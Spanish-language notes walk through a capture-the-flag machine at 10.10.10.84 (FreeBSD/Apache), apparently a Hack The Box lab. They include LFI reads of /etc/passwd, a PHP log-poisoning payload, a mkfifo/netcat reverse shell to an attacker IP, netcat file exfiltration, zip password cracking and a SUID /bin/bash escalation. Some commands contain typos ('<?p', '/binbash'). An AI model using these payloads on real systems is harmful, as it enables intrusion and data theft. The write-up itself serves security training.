## Summary

- IP -> 10.10.10.84
- Ports -> TCP (22, 80), UDP (idk)
- OS ->  Linux
- Services & Applications
    - 22 -> OpenSSH 7.2
    - 80 -> Apache httpd 2.4.29


## Launchpad

-   **Launchpad**: [https://launchpad.net/ubuntu](https://launchpad.net/ubuntu)

## Recon
- Comando -> **whatweb http://< URL>**  Nos dara una breve descripcion del gestor de contenidos del puerto 80
Que es FreeBSD: Es un sistema de codigo abierto para computadoras basado en las CPU de arquitectura x86, Pentium. En la actualidad se ejecuta en once arquitectiras distintas como Alpha, AMD64, IA-64, MISP, PowerPC y UltraSPARC.

Buscamos en la Webpage:

Podemos ponerle al **listfile.php** -> Encontramos un **pwdbackup.txt** que al momento de ponerlo, nos da un passwd encodeada 13 veces en base64 por lo que podemos ver.
- Comando -> **curl -s -X GET "http://10.10.10.84/browse.php?file=pwdbackup.txt" | grep -v "password" | tr -d '\\n' | base64 -d | base64 -d** Miramos las cabeceras de la pagina web (tr=quitamos el salto de linea), hacerlo 13 veces la decode de base 64

Hasta que nos de la passwd.

Si no esta sanitizado podemos hacer un Local File Inclution (LFI) en la Webpage
http://10.10.10.84/browse.php?file=/etc/passwd Y cargamos el archivo passwd de la maquina y ahi podremos ver los usuarios existentes. Por lo que encontramos a charix



----------------
Otra Forma de hacer la maquina es cuando tenemos un LFI y podemos ejecutar comandos Ejecucion Remota de Comandos (RCE) , ahi podemos hacer un Log Poisoning y apuntar a archivos Logs.

Buscamos en Google Freebsd Apache /var/log file 
En FreeBSD la ruta es diferente:
	**/var/log/httpd-access.log** Para ver los log en la Webpage, esto se colocara despues del = de la url de arriba.
	http://10.10.10.84/browse.php?file=/var/log/httpd-access.log  De esta manera...

Ahora nos abrimos el BurpSuite. Para poder capturar la peticion de la url http://10.10.10.84/rce
Una vez dentro de BuroSuite, lo capturamos con la finalidad de que podamos ver el:

Y lo modificaremos en el Repeater
- User-Agent: Mozilla/5.0 ...

En donde ahi podremos borrar el contenido del User-Agent y colocar codigo php para hacer el envenenamiento (Poisoning)
El codigo php inicia ?php
- User-agent: <?p system($_GET['cmd']);  ?>

Ahora en el BurpSuite le damos en el boton Send del Repeater

Y lo que buscaremos injectando el codigo php es que cuando modifiquemos la url de esta manera:
http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=whoami
Nos pueda interpretar los comandos que querramos

Sin desactivar el FoxyProxy de la web, nos ponemos a colocar firenetes comandos:
	whoami
	hostname
	ifconfig
	which nc

Quitamos el FoxyProxy de la web 
Ahora nos ponemos en escucha por el puerto 443 del netcat ya que confirmamos que lo tiene. 
- Comando -> **nc -nlvp 443** Nos ponemos en escucha por el puerto 443, maquinas Linux

Buscamos en Google 'Monkey pnetester reverse shell' y nos da una linea que debemos de poner en la url de la web para netcat, debe ser la segunda linea que encontremos en la pagina, ya que no sabemos si el netcat es antiguo o no.

- http://10.10.10.84/browse.php?file=/var/log/httpd-access.log&cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.17 443 >/tmp/f
	Colocamos nuestra ip en ese comando y el puerto del netcat 
	Debemos de modificar el **&** y pasarlo a formato url-encode que es **%26**

Y este nos da el usuario www


---


## User
Ahora nos conectamos por SSH:
- Comando -> **ssh < user>@< IP>** Para conectarnos por ssh

Podemos ver la primer flag user.txt

- Comando -> **ls -l** Miramos el contenido del directorio y sus permisos (l=ele)
- Comando -> **nc -nlvp 443 > secret.zip** Nos ponemos en escucha por el puerto 443 en nuestra maquina de atacante, maquinas Linux y lo que recibamos lo colocamos en el archivo secret.zip

- Comando -> **nc 10.10.17.4 443 < secret.zip** En la maquina victima hacemos esto para mandar el arhivo que hemos encontrado a la maquina de atacante.

- Comando -> **7z l secret.zip** (l=ele) Podemos ver el contenido interno del archivo zip, gz, bzip2, etc...
- Comando -> **7z x secret.zip** (l=ele) Podemos extraer el contenido interno del archivo zip, gz, bzip2, etc...

Como nos pide una passwd. Podemos usar la herramienta John para que primero nos de un Hash y despues crackear y obtener su passwd.

- Comando -> **zip2john secret.zip > hash** Para que nos devielva el Hash y asi despues poderlo crackear y el resultado del hash lo metemos a un archivo llamado 'hash'.
- Comando -> **john -w:/usr/share/wordlists/rockyou.txt hash** Aplicamos un ataque de fuerza bruta a un archivo hash y como resultado no lo ha encontrado

Recordamos que tenemos una passwd y la colocamos para ver si es la misma. 

Una vez descargado el archivo, procedemos a ver le contenido 
- Comando -> **cat secret** Observamos el contenido del archivo, y miramos cosas raras.
- Comando -> **xxd secret** Para mirar los magic numbers del archivo

Ponemos en Google 'List of Signatures' para poder ver cual seria el resultado de los magic numbers. Y encontramos que es:
no es nada

Ahora seguiremos listando la maquina:
- Comando -> **netstat -na -p tcp** Podemos ver los puertos abiertos en la mquina 
- Comando -> **ps -faux** Listas los procesos que corren en la maquina Linux
Encontramos un **tightvnc**. Esto es una aplicacion informatica de codigo abierto para administracion remota multiplataforma que utiliza el protocolo RFB deVNC para controlar panatlla de otro equipo de forma remota. Y los puerto que comunmente corre es el 5900-5901, 5800-5801

Tenemos el puerto 5901 abierto en la maquina victima, por lo que lo podemos usar para hacer la conexion con el viewer sin usar chisel. 
Ahora usaremos un Dinamic Port Forwarding 

Modificaremos el:
**nano /etc/proxychains.conf** Modificaremo este archivo en nuestra maquina
	socks4 127.0.0.1 1080 -> Haremos que la conexion para nuestra maquina se efectue en el puerto 1080


## Root
- Comando -> **ssh < user>@< IP> -D 1080** Para conectarnos por ssh (D=Dinamic Port Forwarding) y colocamos el puerto que anteriormente habiamos configurado y le colocamos la passwd que teniamos de Charix
- Comando -> **proxychains vncviewer -passwd secret 127.0.0.1:5901** Nos permite conectarnos al vncviewer de una maquina remotamente
	passwd -> Archivo qiue habiamos encontrado con las passwd llamado secret

Podremos visualizar la flag root.txt

Ademas podemos darle privilegios al usuario Charix para que desde la conexion que ya tenemos por ssh podamos convertirnos en root. 
- Comando -> **chmod u+s /bin/bash** Para darle privilegios a la bash suid en este caso desde la interfaz remota
- Comando -> **ls -l /bin/bash** Miramos los privilegios de la bash en el usuario Charix
- Comando -> **/binbash** Colocamos ese comando en el usuario Charix y ya seriamos root